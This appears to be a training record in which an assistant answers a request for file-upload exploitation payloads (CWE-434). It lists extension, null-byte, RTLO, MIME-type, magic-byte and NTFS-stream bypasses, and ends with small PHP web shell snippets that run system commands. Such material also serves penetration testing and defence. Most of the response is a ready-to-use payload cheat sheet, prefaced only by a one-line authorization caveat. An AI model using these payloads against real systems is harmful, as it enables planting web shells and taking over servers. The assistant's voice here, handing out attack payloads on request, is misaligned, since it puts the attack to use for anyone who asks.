# UPLOAD — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: upload
- cwe: CWE-434

## Scenario

How do I test for and exploit Upload Insecure Files using the Upload Tricks technique? Give me the payloads.

## Analysis / Response

**Upload Tricks** — this technique applies to Upload Insecure Files. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

**Extensions**:

* Use double extensions : `.jpg.php, .png.php5`
* Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
* Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`
* Null byte (works well against `pathinfo()`)
    * `.php%00.gif`
    * `.php\x00.gif`
    * `.php%00.png`
    * `.php\x00.png`
    * `.php%00.jpg`
    * `.php\x00.jpg`
* Special characters
    * Multiple dots : `file.php......` , on Windows when a file is created with dots at the end those will be removed.
    * Whitespace and new line characters
        * `file.php%20`
        * `file.php%0d%0a.jpg`
        * `file.php%0a`
    * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
    * Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
    * Multiple special characters: `file.jsp/././././.`
    * UTF8 filename: `Content-Disposition: form-data; name="anyBodyParam"; filename*=UTF8''myfile%0a.txt`

* On Windows OS, `include`, `require` and `require_once` functions will convert "foo.php" followed by one or more of the chars `\x20` ( ), `\x22` ("), `\x2E` (.), `\x3C` (<), `\x3E` (>) back to "foo.php".
* On Windows OS, `fopen` function will convert "foo.php" followed by one or more of the chars `\x2E` (.), `\x2F` (/), `\x5C` (\) back to "foo.php".
* On Windows OS, `move_uploaded_file` function will convert "foo.php" followed by one or more of the chars `\x2E` (.), `\x2F` (/), `\x5C` (\) back to "foo.php".

* On Windows OS, when running PHP on IIS some characters are automatically converted to other characters when it is going to save a file (e.g. `web<<` becomes `web**` and can replace `web.config`).
    * `\x3E` (>) is converted to `\x3F` (?)
    * `\x3C` (<) is converted to `\x2A` (*)
    * `\x22` (") is converted to `\x2E` (.), to use this trick in a file upload request the "`Content-Disposition`" header should use single quotes (e.g. filename='web"config').

**File Identification**:

MIME type, a MIME type (Multipurpose Internet Mail Extensions type) is a standardized identifier that tells browsers, servers, and applications what kind of file or data is being handled. It consists of a type and a subtype, separated by a slash. Change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif` to disguise the content as an image.

* Common images content-types:

    ```cs
    Content-Type: image/gif
    Content-Type: image/png
    Content-Type: image/jpeg
    ```

* Content-Type wordlist: [SecLists/web-all-content-types.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)

    ```cs
    text/php
    text/x-php
    application/php
    application/x-php
    application/x-httpd-php
    application/x-httpd-php-source
    ```

* Set the `Content-Type` twice, once for unallowed type and once for allowed.

[Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) - Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.

* PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
* JPG: `\xff\xd8\xff`
* GIF: `GIF87a` OR `GIF8;`

**File Encapsulation**:

Using NTFS alternate data stream (ADS) in Windows.
In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")

**Other Techniques**:

PHP web shells don't always have the `<?php` tag, here are some alternatives:

* Using a PHP script tag `<script language="php">`

    ```html
    <script language="php">system("id");</script>
    ```

* The `<?=` is shorthand syntax in PHP for outputting values. It is equivalent to using `<?php echo`.

    ```php
    <?=`id`?>
    ```
